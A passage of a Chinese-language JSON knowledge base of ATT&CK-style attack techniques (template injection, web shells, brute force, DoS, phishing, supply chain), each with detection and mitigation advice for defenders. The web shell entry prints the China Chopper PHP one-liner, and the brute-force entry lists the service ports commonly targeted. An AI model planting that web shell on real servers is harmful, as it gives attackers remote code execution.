[{
	"id": "T1221",
	"description": "<p>Microsoft的Open Office XML（OOXML）规范为Office文档定义了基于XML的格式（.docx，xlsx，.pptx），以替换较旧的二进制格式（.doc，.xls，.ppt）。OOXML文件被一起压缩到ZIP包。包中的各种XML文件称为部件，包含用来共同定义文档呈现方式的属性。</p><p>部件内的属性可能会引用通过联机URL访问的共享公共资源。例如，模板属性引用文件，作为预格式化的文档蓝图，在加载文档时获取该文件。</p><p>攻击者可能会滥用此技术，在一开始就隐藏要通过文档（即脚本）执行的恶意代码。注入到文档中的模板引用可能会在加载文档时允许获取并执行恶意负载。这些文档可以通过其他技术（如钓鱼攻击附件和/或污点共享内容）传递，并且可能会避开静态检测，因为在获取恶意有效负载之前，不存在典型的指标（VBA宏，脚本等）。在外面已知一些利用模板注入加载漏洞攻击代码的示例。</p><p>此技术还可以通过注入SMB/HTTPS（或其他凭据提示）URL并触发身份验证尝试来启用强制身份验证。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["杀毒软件", "邮件网关", "网络入侵检测系统", "Web日志"]
	},
	"relations": {
		"detection": "<p>分析进程行为来确定Office应用程序是否正在执行操作，例如打开网络连接、读取文件、生成异常子进程（例如：PowerShell）或其他可能与攻击后行为相关的可疑操作。</p>",
		"mitigations": [{
			"name": "杀毒软件",
			"description": "可以使用网络/主机入侵防御系统、杀毒软件和引爆室来防止获取文档和/或执行恶意负载。"
		}, {
			"name": "特性/程序禁用或删除",
			"description": "考虑禁用Microsoft Office宏/活动内容，以防止执行文档中的恶意负载，尽管此设置可能无法缓解此技术的强制身份验证使用所带来的影响。"
		}, {
			"name": "网络入侵防御",
			"description": "可以使用网络/主机入侵防御系统、杀毒软件和引爆室来防止获取文档和/或执行恶意负载。"
		}, {
			"name": "用户培训",
			"description": "培训用户如何识别社交工程技术和如何识别鱼叉式网络钓鱼电子邮件。"
		}],
		"tactics": ["TA0001", "TA0005"]
	},
	"name": "模板注入"
}, {
	"id": "T1100",
	"description": "<p>Web shell是web脚本，放置在可公开访问的web服务器上。攻击者可能会将web服务器用作网关。Web shell可以在承载web服务器的系统上提供一组待执行的函数或命令行界面。除了服务器端脚本之外，web shell可能还有一个客户端接口程序，用于与web服务器通信（例如，参见China Chopper Web shell客户端）。</p><p>如果攻击者的主要访问方式被发现并移除，攻击者可能会使用web shell作为冗余访问或持久性机制。</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS"],
		"dataSources": ["杀毒软件", "认证日志", "文件监控", "Netflow/Enclave技术网络流分析", "进程监控"]
	},
	"relations": {
		"detection": "<p>Web shell很难检测到。与其他形式的持久远程访问不同，它们不会发起连接。服务器上的webshell部分可能很小，看起来无害。例如，China Chopper Web shell PHP版本中的小负载：</p><p><code>&lt;?php @eval($_POST['password']);&gt;</code></p><p>不管怎样，检测机制还是存在的。可通过进程监控来检测执行可疑操作（如运行cmd或访问不在web目录中的文件）的web服务器。可通过文件监控来检测web服务器的web目录中与web服务器内容更新不匹配且可能表示已有web shell脚本植入的文件更改。还可监控针对web服务器的日志认证尝试，以及由web服务器或内部网络发起或接收的异常流量模式。</p>",
		"mitigations": [{
			"name": "特权账号管理",
			"description": "审核账号和组权限，确保用于管理服务器的账号与内部网络中具有以下特征的用户账号和权限不重叠：账号和权限可以通过凭据访问获取，用于登录到web服务器并构建web shell或者从web服务器进入内部网络。"
		}, {
			"name": "软件更新",
			"description": "确保定期对面向外部的web服务器打补丁，防止攻击者利用权限升级获取远程代码访问权限或利用文件包含缺陷上传文件或脚本用作web网页。"
		}],
		"tactics": ["TA0001", "TA0003", "TA0004"]
	},
	"name": "Web命令执行环境"
}, {
	"id": "T1110",
	"description": "<p>攻击者想访问某账号但不知道账号密码或仅获得了账号的密码哈希时，可能会使用暴力破解技术尝试访问此账号。</p><p>凭据导出用于获取密码哈希。Pass the Hash方法行不通时，攻击者才可能会用凭据导出的方法来获取密码哈希。攻击者可以使用相应技术来系统地猜测用于计算哈希的密码，或者可以使用预先计算好的彩虹表来破解哈希。攻击者通常在目标网络以外他们自己所控制的系统上来破解哈希。</p><p>攻击者可能会在对密码和哈希一无所知的情况下胡乱尝试密码来强行登录，或使用一系列已知或可能的密码来尝试暴力破解。这种操作的风险比较大，因为它可能会导致大量认证失败和账号锁定，具体取决于组织的登录失败策略。</p><p>既然使用多个密码来暴力破解一个账号会导致该账号被锁定，攻击者可能会使用密码喷洒技术来规避这个风险。密码喷洒技术使用一个（例如“Password01”）或一小列满足域的复杂性策略的密码（并且可能是常用的密码）和网络上许多其他不同账号来尝试登录。</p><p>密码喷洒时，通常会使用通用端口上的管理服务。密码喷洒常常针对如下服务：</p><p>·         SSH (22/TCP)</p><p>·         Telnet (23/TCP)</p><p>·         FTP (21/TCP)</p><p>·         NetBIOS/SMB /Samba (139/TCP &amp; 445/TCP)</p><p>·         LDAP (389/TCP)</p><p>·         Kerberos (88/TCP)</p><p>·         RDP/终端服务 (3389/TCP)</p><p>·         HTTP/HTTP管理服务 (80/TCP &amp; 443/TCP)</p><p>·         MSSQL (1433/TCP)</p><p>·         Oracle (1521/TCP)</p><p>·         MySQL (3306/TCP)</p><p>·         VNC (5900/TCP)</p><p>除了管理服务以外，攻击者还可能“使用联合身份认证协议来针对单点登录（SSO）和云化应用程序”，以及面向外部的电子邮件应用程序，例如Office 365。</p><p>默认环境中，LDAP和Kerberos连接尝试不太可能通过SMB触发事件，这会创建Windows事件4625“登录失败”。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows", "Office 365", "Azure AD", "SaaS"],
		"permissionRequired": ["用户"],
		"dataSources": ["Office 365账户日志", "认证日志"]
	},
	"relations": {
		"detection": "<p>由于攻击者通常在目标网络范围之外破解哈希，因此很难检测到哈希破解行为。</p><p>监控认证日志来查看是否有有效账号登录系统和应用失败的日志。如果认证失败率很高，则很可能有攻击者试图使用合法凭据来实施暴力破解从而获取系统访问权限。</p><p>还要查看是否有多个不同账号的、可能是由于密码喷洒导致的失败认证尝试。</p><p>关于密码喷洒，请查看是否有以下事件：</p><p>·                  域控制器：事件ID 4625 “审核登录”（成功和失败）。</p><p>·                  域控制器：事件4771 “审核Kerberos认证服务”（成功与失败）。</p><p>·                  所有系统：事件4648 “审核登录”（成功和失败）。</p>",
		"mitigations": [{
			"name": "账号使用策略",
			"description": "设置失败登录尝试达到一定数量后锁定账号的策略来防止密码被攻击者猜中。过于严格的策略可能会导致拒绝服务的情况并导致环境无法使用，而且暴力破解针对的所有账号都会被锁定。"
		}, {
			"name": "多因子认证",
			"description": "使用多因子身份认证。可能的情况下，还应在面向外部的服务上启用多因子身份认证。"
		}, {
			"name": "密码策略",
			"description": "创建密码策略时，请参考NIST准则。"
		}],
		"tactics": ["TA0001", "TA0006"]
	},
	"name": "暴力破解"
}, {
	"id": "T1498",
	"description": "<p>攻击者可能会执行网络拒绝服务（DoS）攻击来降低或阻止用户获得资源的可能性。方法包括耗尽服务（比如，网站、电子邮件、DNS和web应用）所依赖的网络带宽。已发现有攻击者出于政治目的或为了支持其它恶意活动而实施网络DoS攻击，包括分散注意力，黑客行为和敲诈勒索。</p><p>网络DoS攻击发生时，指向资源或资源依赖的网络连接和设备的恶意流量会耗尽系统网络连接的带宽容量。例如，攻击者可能会向以1Gbps带宽与Internet互联的网络中托管的某个服务器发送10Gbps的流量。DoS攻击可能发生于单个系统或分布在Internet上的多个系统，通常称为分布式DoS（DDoS）。已发现许多使网络饱和的不同方法，但大多数方法可归为两大类：直接网络泛洪和反射放大。</p><p>可以采用多种方法来执行网络DoS攻击，包括IP地址伪造和僵尸网络。</p><p>攻击者可能会使用攻击系统的原始IP地址或伪造源IP地址来使得防御程序很难从攻击流量追溯到攻击系统或启用反射。这会降低或消除网络防御设备上源地址过滤的有效性，从而增加防御程序防御攻击的难度。</p><p>僵尸网络通常用于对网络和服务进行DDoS攻击。大型僵尸网络可以从遍布全球互联网的系统中产生大量流量。攻击者可能拥有足够资源来构建和控制自己的僵尸网络基础设施，也可以租用已有的僵尸网络来实施攻击。在DDoS的一些最坏情况下，许多系统被用来生成请求，每个系统只需要发送少量数据就可以产生足够的数据量来使得目标网络饱和。这种情况下，区分DDoS流量和合法客户端变得非常困难。僵尸网络已经被用于一些引人瞩目的DDoS攻击行动，例如2012年针对美国主要银行的一系列攻击。</p><p>关于直接针对托管系统的DoS攻击，请参考“终端拒绝服务”。</p><p>直接网络泛洪</p><p>直接网络泛洪攻击是指使用一个或多个系统向目标服务的网络发送大量网络数据包。几乎任何网络协议都可以用于直接网络泛洪攻击。通常使用无状态协议（例如UDP或ICMP），但也可以使用有状态协议（例如TCP）。</p><p>反射放大</p><p>攻击者可能会通过反射来放大其攻击流量。这种类型的网络DoS攻击利用了第三方服务器中介，这个第三方服务器会对伪造的源IP地址做出回应。该第三方服务器通常称为反射器。攻击者以伪造的源IP地址发送数据包到反射器来实施反射攻击。与直接网络泛洪攻击类似，攻击者可能会使用多个系统来实施攻击，也可以使用僵尸网络。同样地，攻击者可以使用一个或多个反射器将流量集中到目标上。</p><p>反射攻击通常利用响应量大于请求量的协议来放大其流量，通常称为反射放大攻击。攻击者可能能够生成比发送到放大器的请求大几个数量级的攻击流量。增长程度取决于许多变量，例如相关协议、所使用的技术以及实际造成攻击量放大的放大服务器。DNS和NTP是启用发射泛洪攻击的两个主要协议。当然也有一些其它协议启用发射泛洪攻击的相关记录。特别是，memcache协议显示出它是一个强大的协议，其放大倍数高达请求包的51200倍。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["传感器健康和状态", "网络协议分析", "Netflow/Enclave技术网络流分析", "网络入侵检测系统", "网络设备日志"]
	},
	"relations": {
		"detection": "<p>有时可以在网络DoS攻击效果足以对服务的可用性造成重大影响之前就检测到攻击的存在，但通常需要非常积极的监控和灵敏度，或者上游网络服务提供商所提供的服务。可使用典型的网络吞吐量监控工具（如netflow、SNMP和自定义脚本）来检测网络或服务利用率的突然增加。对网络流量的实时、自动化和定性研究可以识别某种协议中的流量突然激增，可以用于在网络DoS攻击开始时就检测到它。然后，可以使用上述分析工具来确定导致中断的DoS攻击类型，并帮助进行补救。</p>",
		"mitigations": [{
			"name": "网络流量过滤",
			"description": "当泛洪数据量超过目标网络连接的容量时，通常有必要拦截上游的传入流量，从合法流量中过滤出攻击流量。此类防御措施可以由托管Internet服务提供商（ISP）,第三方（例如CDN）或专门从事DoS缓解的提供商提供。根据洪泛数据量，可通过阻止源地址发起攻击、阻止目标端口或阻止用于传输的协议来进行内部过滤。由于即时响应可能需要第三方的快速参与，分析网络DoS攻击影响的关键资源的相关风险并制定容灾计划/业务连续性计划。"
		}],
		"tactics": ["TA0001", "TA0040"]
	},
	"name": "网络拒绝服务"
}, {
	"id": "T1190",
	"description": "<p>面向公众应用的利用指的是攻击者利用面向Internet的计算机系统或程序的弱点，使用软件、数据或命令来造成意外行为。系统弱点可能是缺陷、故障或设计漏洞。这些应用通常是网站，但也可以包括数据库（如SQL），标准服务（如SMB或SSH），以及任何带有可通过Internet访问的开放套接字的应用（如web服务器和相关服务）。面向公众应用的利用可能包括防御逃逸目的的利用，具体取决于被利用的弱点。</p><p>如果应用程序托管在云化基础架构上，则利用此应用可能会破坏底层实例。攻击者可能会利用此漏洞通过调用云API或利用弱身份和访问管理策略来实施攻击。</p><p>OWASP（开放式web应用程序安全项目）前10名和CWE（通用缺陷列表）前25名突出显示了网站和数据库最常见的web漏洞。</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS", "AWS", "GCP", "Azure"],
		"dataSources": ["Azure活动日志", "AWS CloudTrail日志", "Stackdriver日志", "网络抓包", "web日志", "web应用防火墙日志", "应用日志"]
	},
	"relations": {
		"detection": "<p>通过应用日志监控来查看日志中是否有漏洞攻击企图或攻击成功的异常迹象。通过深度数据包检查来查看常见漏洞攻击相关行为，例如SQL注入。Web应用防火墙可以检测到与漏洞攻击企图的不恰当输入。</p>",
		"mitigations": [{
			"name": "应用隔离和沙箱",
			"description": "隔离应用来限制利用目标访问其他进程和系统功能。"
		}, {
			"name": "漏洞利用防护",
			"description": "使用web应用防火墙来限制应用暴露，从而防止应用漏洞攻击。"
		}, {
			"name": "网络分区",
			"description": "将对外服务器和服务与网络上其余部分分开，把对外服务器和服务部署在DMZ或使用单独的托管基础架构。"
		}, {
			"name": "特权账号管理",
			"description": "赋予服务账号最小权限，限制被利用进程从系统其余部分获得权限。"
		}, {
			"name": "软件更新",
			"description": "定期扫描对外系统是否存在漏洞并确立系统快速修复步骤，以便扫描和公开披露过程中发现关键漏洞时快速打补丁。"
		}, {
			"name": "漏洞扫描",
			"description": "定期扫描对外系统是否存在漏洞并确立系统快速修复步骤，以便扫描和公开披露过程中发现关键漏洞时快速打补丁。"
		}],
		"tactics": ["TA0001"]
	},
	"name": "面向公众应用的利用"
}, {
	"id": "T1189",
	"description": "<p>路过式攻击指的是攻击者利用用户正常访问和浏览网站来获取系统访问权限。攻击者通常利用此技术针对用户的web浏览器来实施漏洞攻击。他们也可能会侵入网站进行非攻击行为，例如获取应用程序访问令牌。</p><p>存在多种向浏览器传递漏洞攻击代码的方法，包括：</p><p>·         注入某种形式恶意代码，例如JavaScript、iFrames和跨站脚本，来攻击合法网站。</p><p>·         利用合法广告提供商来支付和投放恶意广告。</p><p>·         利用内置的web应用接口插入某种对象来显示web内容（例如：论坛帖子、评论以及其他用户可控制的web内容）或在访问客户端上执行脚本。</p><p>攻击者通常利用特定群体（例如：政府、特殊行业或地区）访问的网站，锁定特定用户或基于共同兴趣锁定特定用户群组来实施攻击。这种针对性攻击被称为战略性web攻击或水坑攻击。已知好几个这种攻击的例子。</p><p>典型的路过式攻击过程如下：</p><p>1.        用户访问某个带有攻击者控制内容的网站。</p><p>2.        脚本自动执行。脚本通常搜索浏览器和插件版本来查看是否可能存在漏洞。</p><p>3.        此过程可能需要用户启用脚本或活动网站组件并忽略警告对话框。</p><p>4.        发现版本存在漏洞后，将漏洞攻击代码传递给浏览器。</p><p>5.        如果漏洞攻击成功，在用户系统执行攻击者代码，除非有其他保护措施。</p><p>6.        某些情况下，传递漏洞攻击代码前，攻击者需在初始扫描后第二次访问网站。</p><p>与利用面向公众的应用漏洞不同，此技术的重点是在用户访问网站时利用客户端端点上的软件。攻击者通常使用此技术访问内部网络上的系统，而不太可能是隔离区的外部系统。</p><p>攻击者还可能入侵网站将用户导向恶意应用程序，从而盗取令牌以访问受保护的应用程序并获取信息。这些恶意应用程序是在合法网站上以窗口形式弹出给用户的。</p>",
	"details": {
		"platform": ["Windows", "Linux", "macOS", "SaaS"],
		"permissionRequired": ["用户"],
		"dataSources": ["网络抓包", "网络设备日志", "网络进程使用", "Web代理", "网络入侵检测系统", "SSL/TLS检查"]
	},
	"relations": {
		"detection": "<p>防火墙和代理可用来查看URL中是否携带已知的错误域或参数。也可用来对网站及所求资源做信誉分析，例如分析域名的使用年数，注册人，是否在已知错误列表中，以及之前有多少其他用户已连接到该域。</p><p>网络入侵检测系统（有时带SSL/TLS MITM检查）可用来查找已知的恶意脚本（常被重用的脚本有侦察、堆喷射和浏览器识别脚本）、常见脚本混淆以及漏洞攻击代码。</p><p>检测合法网站的路过式攻击可能是困难的。还要在端点系统上查找能表明攻陷成功的行为，例如浏览器进程的异常行为，包括写入磁盘的可疑文件，通过进程插入来试图掩盖执行的证据，发现的证据，以及表明有其它工具传输到系统的异常网络流量。</p>",
		"mitigations": [{
			"name": "应用隔离和沙箱",
			"description": "可用浏览器沙箱来缓解漏洞攻击的一些影响，但可能会有沙箱逃逸。也可通过其他类型的虚拟化和应用微分区来缓解客户端漏洞攻击的影响。对于这些类型的系统，在实施中仍然可能存在其它漏洞利用和缺陷等风险。"
		}, {
			"name": "漏洞利用防护",
			"description": "可用安全应用，比如WDEG（Windows Defender Exploit Guard）和EMET（Enhanced Mitigation Experience Toolkit），来查找漏洞攻击行为，从而缓解某些漏洞攻击行为的影响。也可通过控制流完整性检查来识别和阻止软件攻击。许多保护措施依赖于体系结构和目标应用二进制文件的兼容性。"
		}, {
			"name": "Web内容限制",
			"description": "可用广告拦截器来立即阻止执行广告中携带的恶意代码。也可通过脚本拦截扩展来阻止执行漏洞攻击过程中常用的JavaScript。"
		}, {
			"name": "软件更新",
			"description": "确保更新所有的浏览器和插件，防止漏洞利用。请使用启用了安全特性的最新浏览器。"
		}],
		"tactics": ["TA0001"]
	},
	"name": "路过式攻击"
}, {
	"id": "T1133",
	"description": "<p>VPN、Citrix等远程服务以及其它访问机制允许用户从外部访问企业内部网络资源。通常有远程服务网关来管理这些服务连接和凭据认证。Windows远程管理等服务也可以在外部使用。</p><p>攻击者可能会通过远程服务来初始访问网络和/或在网络中停留。通常，用户须使用有效账号才能访问服务。攻击者可能会通过凭据欺骗或入侵企业网络从用户侧获取凭据的方式来获得有效账号权限。在操作期间，对远程服务的访问可用作冗余访问的一部分。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["认证日志"]
	},
	"relations": {
		"detection": "<p>根据最佳实践检测攻击者使用有效账号来应对远程服务身份认证的行为。收集认证日志并分析异常访问模式，活动窗口以及正常工作时间之外的访问。</p>",
		"mitigations": [{
			"name": "特性/程序禁用或删除",
			"description": "禁用或阻止可能不必要的远程可用服务。"
		}, {
			"name": "网络资源访问限制",
			"description": "通过集中管理的集中器（如VPN和其他托管远程访问系统）来限制远程服务访问。"
		}, {
			"name": "多因子认证",
			"description": "对远程服务账号使用双因子或多因子强认证，从而降低攻击者使用盗取凭据的能力。但请注意双因子认证实施中有时可能会有双因子认证拦截技术。"
		}, {
			"name": "网络分区",
			"description": "通过网络代理、网关和防火墙拒绝直接远程访问内部系统。"
		}],
		"tactics": ["TA0003", "TA0001"]
	},
	"name": "外部远程服务"
}, {
	"id": "T1200",
	"description": "<p>计算机配件、计算机或网络硬件可能被用作载体接入系统从而获得执行权限。虽然少有公开报道提及APT组织利用这些技术，但是有很多渗透测试人员通过硬件添加的方法来实现初始访问。</p><p>商业和开源产品都有可能被利用来完成诸如被动网络分流，中间人加密破解，击键注入攻击，通过直接内存访问（DMA）读取内核内存，给既有网络添加无线访问等攻击方式。</p>",
	"details": {
		"platform": ["Windows", "Linux", "macOS"],
		"dataSources": ["资产管理", "数据泄漏防护"]
	},
	"relations": {
		"detection": "<p>可借助资产管理系统来发现本不应该接入的计算机系统或者网络设备。</p><p>可使用终端探针来检测通过USB接口、雷电接口以及其他外设接口添加的硬件。</p>",
		"mitigations": [{
			"name": "限制网络资源访问",
			"description": "设立网络访问控制策略，如使用设备证书、802.1x标准等。只允许注册设备使用DHCP，从而避免未注册设备与受信任系统通信。"
		}, {
			"name": "限制硬件安装",
			"description": "使用终端安全策略配置和终端监控代理来阻拦未知设备和配件。"
		}],
		"tactics": ["TA0001"]
	},
	"name": "硬件添加"
}, {
	"id": "T1091",
	"description": "<p>攻击者可能会通过拷贝恶意软件到移动存储介质然后插入系统并利用Autorun功能来执行恶意软件，从而进入到系统（可能是断连的或物理隔离的网络）。在横向移动的情况下，可能会通过篡改移动存储介质上的可执行文件或者拷贝恶意文件并重命名为看似合法的文件从而欺骗使用者在隔离的系统上执行。在初始访问的情况下，可能会手动操控移动存储介质，篡改移动存储介质格式化系统，或者修改固件。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控", "数据泄漏防护"]
	},
	"relations": {
		"detection": "<p>监控移动存储介质上的文件访问。检测移动存储介质插入后或由用户启动时从此介质上执行的进程。如果以此方式使用远程访问工具来横向移动，那么后续会发生一系列动作，如打开到C2（命令与控制）的网络连接，或者发现系统和网络。</p>",
		"mitigations": [{
			"name": "禁用或删除相关功能或程序",
			"description": "非必要情况下，禁止启用Autorun功能。非业务需要的情况下，在组织规章层面限制或者禁止使用移动存储介质。"
		}, {
			"name": "限制硬件安装",
			"description": "在特定网络内限制使用USB设备以及移动存储介质。"
		}],
		"tactics": ["TA0008", "TA0001"]
	},
	"name": "通过移动存储进行复制"
}, {
	"id": "T1193",
	"description": "<p>鱼叉式钓鱼附件是网络钓鱼的一种特殊变体。它与其他形式的鱼叉式钓鱼攻击不同之处在于它以附件形式将恶意文件附加到电子邮件中。所有的鱼叉式钓鱼攻击都是针对一个具体的个人、公司或者行业的数字化社会工程学攻击手法。攻击者通常将文件附加到鱼叉式网络钓鱼电子邮件，依靠用户主动执行来获得执行权限。</p><p>附件可能有多种文件类型如Microsoft Office系列文件，可执行文件，PDF文件或者归档文件。用户打开附件（甚至点击通过了安全确认）后，攻击负载会利用系统漏洞执行或者直接在系统上执行。通常邮件内容会捏造一些合理的理由诱使用户打开附件，甚至告诉用户如何绕过系统的安全保护限制来打开附件。邮件还可能还会告诉用户如何解密附件（比如提供zip文件的密码）从而逃避邮件防护类产品的检测。攻击者常常会用修改文件后缀名，文件图标等方式使可执行的附件看起来像是文档类文件，或者让利用某种应用程序漏洞的附件看起来像是其他应用程序的文件格式。</p>",
	"details": {
		"platform": ["Windows", "macOS", "Linux"],
		"dataSources": ["文件监控", "网络抓包", "网络入侵检测系统", "沙箱", "邮件网关", "邮件服务器"]
	},
	"relations": {
		"detection": "<p>可使用网络入侵防御系统（IPS）和邮件网关可以用来检测传输中的带恶意附件的钓鱼邮件。也可使用沙箱来识别恶意附件。相关的检测方法可以基于特征码也可以基于行为，但是攻击者也会试图构造特别的附件来逃避这些检测方法。</p><p>杀毒软件可以检测到电子邮件服务器或用户计算机上存储的恶意文件和附件。一旦附件被打开（如Microsoft Word或PDF文件被打开后连接了互联网或者生成了Powershell.exe），端点检测或网络检测可检测“客户端执行利用”及“脚本编程”攻击技术相关恶意事件。</p>",
		"mitigations": [{
			"name": "杀毒程序",
			"description": "杀毒程序可以自动隔离可疑文件"
		}, {
			"name": "网络入侵防御",
			"description": "网络入侵防御系统（IPS）以及其他用来扫描并移除恶意邮件附件的系统都可以用来阻拦此类攻击行为。"
		}, {
			"name": "附件类型限制",
			"description": "将默认阻拦不应该通过邮件发送的未知或者未使用的附件类型（如.scr，.exe，.pif，.cpl）作为最佳实践。某些邮件扫描设备可以打开并分析压缩、加密文件格式，如zip、rar等常常被用来藏匿恶意文件的文件格式。"
		}, {
			"name": "用户培训",
			"description": "培训用户如何识别社会工程学技术和如何识别钓鱼邮件。"
		}],
		"tactics": ["TA0001"]
	},
	"name": "鱼叉式钓鱼攻击附件"
}, {
	"id": "T1192",
	"description": "<p>鱼叉式钓鱼链接是网络钓鱼的一种特殊变体。它与其他形式的鱼叉式钓鱼攻击不同之处在于它在电子邮件中提供链接来下载恶意软件，而不是以附件形式将恶意文件附加到电子邮件中。这样可以逃避邮件附件检查。</p><p>所有的鱼叉式钓鱼攻击都是针对一个具体的个人、公司或者行业的数字化社会工程学攻击手法。本节所描述的是带链接的鱼叉式钓鱼攻击，也就是在邮件里携带恶意链接。通常，链接将伴随社会工程文本，并需要用户主动点击或将URL复制粘贴到浏览器中，也就是利用用户执行。访问的网站可能会利用漏洞来破坏web浏览器，或者提示用户下载应用、文档、zip文件，甚至可执行文件（具体取决于一开始是以什么理由发送的这封邮件）。攻击者还可能会在邮件中添加链接来直接与邮件阅读器交互，比如嵌入图像（网络漏洞/网络信标）来直接利用终端系统或验证邮件接收。链接还可以将用户导向恶意应用程序，从而盗取令牌以访问受保护的应用程序并获取信息。</p>",
	"details": {
		"platform": ["Windows", "macOS", "Linux", "Office 365", "SaaS"],
		"dataSources": ["网络抓包", "web代理", "邮件网关", "沙箱", "SSL/TLS检查", "DNS记录", "邮件服务器"]
	},
	"relations": {
		"detection": "<p>可对电子邮件执行URL检查（包括扩展缩短的链接）来发现导向已知恶意站点的链接。可用沙箱来检测这些链接，并自动转到这些站点以确定它们是否存在恶意。若用户访问链接，沙箱会等待并捕获内容。</p><p>此技术通常涉及端点上的用户交互。一旦用户执行交互动作，就会针对鱼叉式钓鱼攻击链接进行合理的检测。</p>",
		"mitigations": [{
			"name": "Web内容限制",
			"description": "确定某些可用于鱼叉式钓鱼攻击的网站是否是业务运营所必需的。如果无法有效监控活动或是存在重大风险，请考虑阻止相关网站访问。"
		}, {
			"name": "用户培训",
			"description": "培训用户如何识别社会工程学技术和如何识别待恶意链接的钓鱼邮件。"
		}],
		"tactics": ["TA0001"]
	},
	"name": "鱼叉式钓鱼攻击链接"
}, {
	"id": "T1194",
	"description": "<p>通过服务进行鱼叉式钓鱼攻击是网络钓鱼的一种特殊变体。它与其他形式的鱼叉式钓鱼攻击不同之处在于它不使用企业邮件系统，而是使用第三方服务来实现攻击。</p><p>所有的鱼叉钓鱼攻击都是针对一个具体的个人、公司或者行业的数字化社会工程学攻击手法。在这种情况下，攻击者通过社交媒体，私人邮箱或者其他的不受企业管控的服务来发送消息。与企业相比，这些服务往往都没有严格的安全策略和保护。和大多数的鱼叉式钓鱼攻击一样，这种攻击手法的目的也是和目标建立某种关系或者以某种方式引起目标的兴趣。攻击者会创建虚假的社交账号并给员工发送诸如工作机会的消息，以这样的方式来编造合理的理由询问企业环境中运行的软件，服务与安全策略等信息。攻击者还可以通过这些第三方服务发送恶意链接或者附件给用户。</p><p>一个常见的例子是通过社交媒体与攻击目标建立良好的关系，然后将某些攻击负载发送给目标用户的私人web邮箱。这样可以让攻击者绕开攻击目标的邮件安全保护限制，并且目标用户也更愿意打开这些攻击负载文件，因为这已经是他们期望收到的邮件。哪怕攻击负载没有有效的执行或工作，攻击者还可以持续的和攻击目标用户沟通来定位问题所在直到最终成功。</p>",
	"details": {
		"platform": ["Windows", "macOS", "Linux"],
		"dataSources": ["SSL/TLS检测", "杀毒软件", "Web代理"]
	},
	"relations": {
		"detection": "<p>因为大多数被用于鱼叉式钓鱼攻击的服务都启用了TLS加密，因此需要检查SSL/TLS的初始通信连接。SSL/TLS入侵检测签名或者其他的安全网关设备可以用来检测恶意软件。</p><p>杀毒软件可以检测用户计算机上下载的恶意文件。一旦附件被打开（如Microsoft Word或PDF文件被打开后连接了互联网或者生成了Powershell.exe），端点检测或网络检测可检测“客户端执行利用”及“脚本编程”攻击技术相关恶意事件。</p>",
		"mitigations": [{
			"name": "杀毒程序",
			"description": "杀毒程序可以自动隔离可疑文件。"
		}, {
			"name": "Web内容限制",
			"description": "确定某些社交媒体网站，私人web邮箱或者其他的可能被用于鱼叉式钓鱼攻击的服务是否是业务运营所必须的。如果无法有效监控这些服务上的活动或是存在重大风险，请考虑阻止相关的服务访问。"
		}, {
			"name": "用户培训",
			"description": "培训用户如何识别社会工程学技术和如何识别带恶意链接的钓鱼邮件。"
		}],
		"tactics": ["TA0001"]
	},
	"name": "通过服务进行鱼叉式钓鱼攻击"
}, {
	"id": "T1195",
	"description": "<p>供应链攻击是指攻击者在用户得到交付物之前，通过篡改产品或者产品交付机制从而攻击数据或者系统。</p><p>供应链攻击可以在供应链的任何阶段发生，比如：</p><p>·                  篡改开发工具</p><p>·                  篡改开发环境</p><p>·                  篡改源代码仓库（公开或私有的）</p><p>·                  篡改依赖的开源代码</p><p>·                  篡改软件的更新/分发机制</p><p>·                  感染系统镜像（已经有多起可移动介质在工厂中即被感染的案例）</p><p>·                  用修改过的版本替换合法软件</p><p>·                  向合法的软件分销商销售篡改/假冒的产品</p><p>·                  装运过程中拦截</p><p>虽然供应链攻击可以影响到硬件或者软件的任意组成部分，但是想要获得执行权限的攻击者通常专注于在软件分发或者更新渠道给合法软件添加恶意负载。目标可能是一个特定的受害者集体，或者恶意软件可能广泛的传播给了大众但是只针对特定受害者采取进一步的动作。被广泛采用的开源软件项目也可能被攻击者利用，成为向受害目标添加恶意代码的方法。</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS"],
		"dataSources": ["Web代理", "文件监控"]
	},
	"relations": {
		"detection": "<p>通过哈希校验或者其他的完整性检查机制来验证获得的二进制文件。扫描下载的恶意签名，并在正式部署前尝试测试软件或者更新，记录所有潜在的可疑行为。对硬件做物理检查以查找可能的篡改。</p>",
		"mitigations": [{
			"name": "软件更新",
			"description": "需要执行补丁管理流程来检查未使用的依赖项，未维护或者已经存在漏洞的依赖项，不必要的功能、组件、文件和文档。"
		}, {
			"name": "漏洞扫描",
			"description": "持续监控漏洞披露来源，并使用自动或手动的代码审查工具。"
		}],
		"tactics": ["TA0001"]
	},
	"name": "供应链攻击"
}, {
	"id": "T1199",
	"description": "<p>攻击者可能会破坏或利用能够接触到目标受害者的组织。通过受信任的第三方关系进行访问利用了现有连接，该连接可能不受保护或者比标准的网络访问机制受到的审查更少。</p><p>组织通常授予第二方或第三方外部供应商提升的访问权限，允许他们管理内部系统和云化环境。例如：IT服务承包商、托管安全提供商、基础设施承包商（如暖通空调、电梯、物理安全）。第三方提供商的访问可能仅限于维护中的基础设施，但可能与企业其他部分在同一网络上。所以，攻击者可能会攻击并使用内部网络系统的有效访问账号。</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS", "AWS", "GCP", "Azure", "SaaS"],
		"dataSources": ["Azure活动日志", "Stackdriver日志", "AWS CloudTrail日志", "应用日志", "认证日志", "第三方应用日志"]
	},
	"relations": {
		"detection": "<p>监控第二方和第三方提供商以及其他可作为网络访问手段的受信任实体的活动。根据信任关系的类型，攻击者在执行操作之前可能会访问目标相关的大量信息，尤其是在信任关系基于IT服务的情况下。攻击者可能能够快速实现目标。因此，适当监控凭凭据访问、横向移动以及收集相关的行为对于入侵检测非常重要。</p>",
		"mitigations": [{
			"name": "网络分区",
			"description": "可通过网络分区来隔离不需要广泛网络访问的基础设施组件。"
		}, {
			"name": "用户账号控制",
			"description": "正确管理信任关系中各方使用的账号和权限，最大限度地减少各方的滥用行为，即便是遭受了攻击。"
		}],
		"tactics": ["TA0001"]
	},
	"name": "可信关系"
}, {
	"id": "T1078",
